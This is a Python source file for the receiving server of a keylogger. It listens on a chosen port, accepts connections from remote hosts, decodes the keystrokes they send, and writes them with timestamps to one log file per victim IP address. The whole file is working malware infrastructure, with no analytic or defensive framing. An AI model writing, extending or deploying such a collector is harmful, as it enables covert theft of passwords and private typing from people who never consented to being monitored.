import socket, threading, sys, time
from colorama import *
from datetime import *

strokes = []

def handle_client(client, address):
	print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} New connection ({str(address[0])})')
	while True:
		try:
			key_stroke = client.recv(4).decode("utf-8", "ignore").replace('\x00', '').strip()
			if not key_stroke:
				continue

			char_stroke = chr(int(key_stroke))

			strokes.append(char_stroke)

			print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.GREEN}Received key stroke ({char_stroke}) ({str(address[0])})')

			with open(f'strokes_{address[0]}.txt', 'a') as f:
				f.write(f'[{datetime.now()}] {char_stroke}\n')
		except:
			break
	client.close()

def main():
	if len(sys.argv) != 2:
		print(f'Correct usage: python {sys.argv[0]} <port>')
		exit()

	port = sys.argv[1]
	if not port.isdigit() or int(port) < 1 or int(port) > 65535:
		print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} Invalid port')
		exit()
	port = int(port)

	init(convert=True)

	sock = socket.socket()
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
	try:
		sock.bind(('0.0.0.0', port))
	except:
		print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} Failed to bind port')
		exit()

	sock.listen()
	while 1:
		threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
	main()
